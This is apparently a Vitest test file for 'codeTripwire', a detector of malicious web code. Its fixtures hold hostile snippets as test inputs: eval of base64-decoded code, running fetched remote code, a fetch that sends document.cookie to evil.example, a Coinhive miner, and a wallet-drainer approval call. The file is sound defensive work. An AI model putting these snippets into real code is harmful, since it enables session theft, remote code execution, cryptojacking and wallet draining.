import { describe, expect, test } from "vitest";
import { codeTripwire } from "./tripwire";

describe("codeTripwire", () => {
  test.each([
    ["eval(atob('ZG9jdW1lbnQ='))", /remote or encoded code/],
    ["const f = new Function(await res.text())", /remote or encoded code/],
    [
      "fetch('https://evil.example/c?d=' + document.cookie)",
      /document\.cookie/,
    ],
    ["import 'coinhive'; new CoinHive.Anonymous()", /miner/],
    [
      "contract.setApprovalForAll('0x1111111111111111111111111111111111111111', true)",
      /drainer/,
    ],
  ])("flags %s", (content, reason) => {
    expect(codeTripwire(content)).toMatch(reason);
  });

  test("allows ordinary code", () => {
    expect(
      codeTripwire(
        "export default function Page() { const theme = document.cookie.includes('dark'); return null }",
      ),
    ).toBeNull();
    expect(codeTripwire("JSON.parse(atob(token))")).toBeNull();
  });
});
